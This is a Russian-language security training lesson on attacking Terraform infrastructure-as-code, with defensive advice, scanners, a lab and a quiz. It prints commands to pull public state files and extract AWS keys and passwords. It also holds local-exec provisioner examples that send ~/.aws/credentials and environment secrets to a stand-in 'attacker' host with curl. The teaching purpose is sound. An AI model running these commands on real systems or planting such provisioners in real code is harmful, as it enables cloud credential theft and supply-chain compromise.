---
id: cloud-terraform
title: "Terraform и IaC: state, провайдеры и злоупотребление инфраструктурой как кодом"
category: cloud
parent: cloud-iac-deep
difficulty: hard
order: 3
tags: [cloud, terraform, iac, state, drift, supply-chain, secrets]
prerequisites: [cloud-supply-chain, cloud-credential-hunting]
useful_for:
  - "Поиск секретов в Terraform state"
  - "Атака на IaC-пайплайны"
  - "Понимание инфраструктуры как кода"
estimated_minutes: 50
summary: "Как атаковать Terraform/IaC: секреты в state и plan-файлах, злоупотребление провайдерами, drift и подмена модулей. Практические приёмы и типовые ошибки."
---

Terraform описывает облако декларативно и хранит **state** — карту реальных ресурсов, часто с секретами в открытом виде. Пайплайн `terraform apply` исполняется с облачными кредами и может создавать любые ресурсы. Урок про то, где искать секреты в IaC и как злоупотребить пайплайном.

## Terraform state: почему это сокровищница

State (`terraform.tfstate`) содержит атрибуты всех ресурсов, включая:

- пароли БД, созданные ресурсом;
- ключи доступа, сгенерированные в `aws_iam_access_key`;
- значения `sensitive`-переменных (они всё равно лежат в state);
- строки подключения, токены, сертификаты.

```bash
# Найти state-файлы
find / -name "*.tfstate*" 2>/dev/null
# Часто в S3/GCS/Blob (remote backend)
aws s3 ls | grep -i terraform
aws s3 cp s3://<bucket>/terraform.tfstate . && jq . terraform.tfstate

# Поиск секретов в state
jq -r '.. | .password? // empty' terraform.tfstate
grep -oE 'AKIA[0-9A-Z]{16}' terraform.tfstate
jq -r '.. | .secret? // .token? // empty' terraform.tfstate
```

Plan-файлы (`tfplan`, `plan.out`) тоже содержат значения. Ищите `.terraform/`, `*.tfvars`, `*.tfplan`.

## Разведка IaC-пайплайна

```bash
# Где исполняется terraform (CI job)
grep -rE 'terraform (plan|apply)|tofu' .github/ .gitlab-ci.yml Jenkinsfile
# Переменные окружения пайплайна
grep -rE 'TF_VAR_|AWS_ACCESS_KEY|ARM_CLIENT' . --hidden
# Модули и их источники
grep -rE 'source *= *"git::|source *= *"https://' *.tf
```

## Злоупотребление провайдерами и modules

Провайдеры и модули исполняют код. Вредоносный модуль (например, с `local-exec`) исполняет команды на машине, где запущен `terraform apply`:

```hcl
module "evil" {
  source = "git::https://attacker/evil.git"
}

# или прямо в ресурсе
resource "null_resource" "pwn" {
  provisioner "local-exec" {
    command = "curl -s https://attacker/?t=$(cat ~/.aws/credentials | base64)"
  }
}
```

Подмена источника модуля (`source`) — supply-chain вектор: если реестр модулей или git-URL подконтролен, ваш `apply` исполняет чужой код.

## Drift и ручные правки

**Drift** — расхождение между state и реальностью. Иногда drift используют, чтобы:

- найти ресурсы, созданные вручную (и их креды);
- замаскировать свои ресурсы под «ручные правки»;
- понять, что защита реально применяет.

```bash
terraform plan           # покажет drift и изменения
terraform state list     # все ресурсы в state
terraform state show <res>
terraform output         # outputs (могут содержать секреты)
```

## Разобранный пример: state в S3 → облачные креды

**Дано:** публично читаемый бакет с `terraform.tfstate`.

1. Находим бакет:

```bash
aws s3 ls s3://<bucket>/ --no-sign-request
aws s3 cp s3://<bucket>/prod/terraform.tfstate . --no-sign-request
```

2. Ищем секреты:

```bash
jq -r '.. | objects | select(.type? == "aws_iam_access_key") |
  .values | "\(.id) \(.secret)"' terraform.tfstate
grep -oE '(AKIA[0-9A-Z]{16}|[A-Za-z0-9/+=]{40})' terraform.tfstate | head
```

3. Проверяем креды:

```bash
AWS_ACCESS_KEY_ID=<AK> AWS_SECRET_ACCESS_KEY=<SK> aws sts get-caller-identity
```

4. Роль из state часто имеет широкие права → эскалация (см. `cloud-privesc-iam`).

## Защита

- **Remote backend с шифрованием и блокировкой** (S3+DynamoDB, GCS).
- **Не хранить секреты в state** — использовать secret-менеджеры и `data`-источники.
- **`sensitive = true`** скрывает значение в выводе, но НЕ в state.
- **Pinned modules** и проверка источников; никаких `git::https` из недоверенных.
- **`terraform plan` в PR без секретов** — не давать недоверенному коду креды.

## Частые ошибки

- **Считать `sensitive` защитой.** В state значение всё равно открыто.
- **Хранить state в публичном бакете.** Классическая утечка.
- **Игнорировать plan-файлы.** Они содержат те же значения.
- **Доверять источнику модуля.** `source` — исполняемый код.
- **Не смотреть outputs.** Часто там пароли и ключи.
- **Забывать про local-exec.** Провиженеры исполняют команды на раннере.

## Что дальше / решение

- Нашли state → ищите `aws_iam_access_key`, пароли, токены.
- Нашли пайплайн → смотрите переменные и модули.
- Нашли drift → анализируйте ручные ресурсы.
- Смежные уроки: `cloud-cloudformation`, `cloud-supply-chain`, `cloud-credential-hunting`.

## Формат state и что в нём лежит

State — JSON, хранящий сопоставление ресурсов Terraform и реальных объектов, а также (часто) секреты: пароли RDS, ключи, токены. Пример структуры:

```json
{"resources":[{"type":"aws_db_instance","instances":[{"attributes":{
 "password":"SuperSecret123","endpoint":"db.xxx.rds.amazonaws.com"}}]}]}
```

Backend может быть локальным, S3, GCS, Azure Blob, Terraform Cloud. S3-backend без шифрования и с широкой политикой — прямая утечка всех секретов инфраструктуры.

## Инструменты анализа IaC

```bash
tflint --recursive
checkov -d . --framework terraform --output json
tfsec . --format json
terrascan scan -t aws -d .
terraform show -json state.json | jq '.values.root_module.resources[] | select(.type=="aws_iam_policy")'
```

`checkov -d` — директория, `--framework`, `-o`; `tfsec .` сканирует текущую папку; `terrascan -t aws` — по облаку. Для state используйте `terraform show -json` и jq.

## Атаки на провайдеры и модули

- **Провайдер из недоверенного источника** — выполнение кода при `terraform init`.
- **Модуль с `provisioner`** — `remote-exec`/`local-exec` запускает команды на CI-раннере.
- **`data`-источники с SSRF** — обращение к metadata.
- **Подмена модуля** — если версия не запинена (`source` без `?ref=`), может быть подменён.

```hcl
module "db" {
  source = "git::https://github.com/org/mod.git"   # без ref → mutable
}
```

## Разобранный пример 2: модуль с local-exec

```hcl
resource "null_resource" "hook" {
  provisioner "local-exec" { command = "curl -d @/etc/terraform.env http://attacker/" }
}
```

При `terraform apply` на CI-раннере секреты окружения уходят наружу. Ищите `local-exec`/`remote-exec` в модулях — это частый путь supply-chain-атаки.

## Практика

1. Найдите state (S3-бакет, git, Terraform Cloud).
2. Извлеките секреты и креды.
3. Проверьте, какие роли/права описаны в IaC.
4. Найдите `local-exec` и unpinned-модули.
5. Сопоставьте state с реальными ресурсами (drift).

## Drift как индикатор

Drift — расхождение между state и реальной инфраструктурой. Он возникает при ручных правках, а для атакующего означает: изменения, сделанные вне Terraform, не будут откачены автоматически. `terraform plan` покажет drift, но если пайплайн не запускается или игнорирует изменения — ваши правки выживут. Проверяйте, есть ли периодический `plan`/`apply` и реагирует ли команда на drift. Часто персистентность через ручные ресурсы остаётся незамеченной именно из-за отсутствия контроля drift.

## Практическое задание

Создайте локальный state с ресурсом, содержащим «секрет». Запустите `terraform show -json` и извлеките значение. Затем найдите в примере модуля `local-exec` и объясните, как он выполнится на CI. Наконец, настройте S3-backend с шифрованием и сравните, как меняется экспозиция секретов. Это даёт понимание, почему state — сокровищница и как её защищать.

## Мини-лаборатория: state в локальном backend

```bash
terraform init
terraform apply -auto-approve
terraform show -json | jq '.values.root_module.resources[].values' | grep -iE 'password|secret|key'
```

Локальный state лежит в `terraform.tfstate` в открытом виде. Убедитесь, что он не попадает в git (`.gitignore`), а для командных проектов используется зашифрованный remote backend с ограниченным доступом. Утечка state = утечка всей инфраструктуры.

## Быстрая проверка state

```bash
aws s3 ls | grep tfstate
aws s3 cp s3://bucket/terraform.tfstate . --no-sign-request
jq '.resources[].instances[].attributes' terraform.tfstate | grep -iE 'password|secret|key'
```

State в открытом бакете — частая находка. Проверьте также Terraform Cloud/remote backend и git-историю на `.tfstate`.

## Квиз

```quiz
- question: "Почему Terraform state считается сокровищницей?"
  options:
    - "В нём в открытом виде лежат атрибуты ресурсов, включая секреты"
    - "Он шифрует все данные"
    - "Он не содержит значений"
    - "Он хранится только в памяти"
  answer: 0
  explanation: "State хранит реальные значения ресурсов."
- question: "Защищает ли флаг sensitive=true значение в state?"
  options:
    - "Нет, он скрывает вывод, но значение остаётся в state"
    - "Да, шифрует state"
    - "Да, удаляет значение"
    - "Да, блокирует apply"
  answer: 0
  explanation: "sensitive влияет на вывод, не на хранение."
- question: "Чем опасен произвольный source модуля?"
  options:
    - "Модуль исполняет код на машине, где запущен apply"
    - "Он ускоряет план"
    - "Он меняет цвет вывода"
    - "Он безвреден"
  answer: 0
  explanation: "Модули и провайдеры исполняют код."
- question: "Что такое drift в Terraform?"
  options:
    - "Расхождение между state и реальной инфраструктурой"
    - "Скорость apply"
    - "Формат .tf"
    - "Тип провайдера"
  answer: 0
  explanation: "Drift — ручные изменения вне Terraform."
- question: "Как чаще всего утекает prod state?"
  options:
    - "Публично доступный S3/GCS/Blob backend"
    - "Через DNS"
    - "Через favicon"
    - "Через robots.txt"
  answer: 0
  explanation: "Открытый remote backend — классическая утечка."
```

## Где пригодится

- **Red team:** IaC-пайплайн как путь к облачным кредам.
- **Bug bounty:** открытые state-бакеты и мисконфиги.
- **Пентест:** аудит backend, модулей, провиженеров.
- **Работа/DevSecOps:** шифрование state, pinned-модули, вынос секретов.
- **Дальше по дереву:** `cloud-cloudformation`, `cloud-supply-chain`.
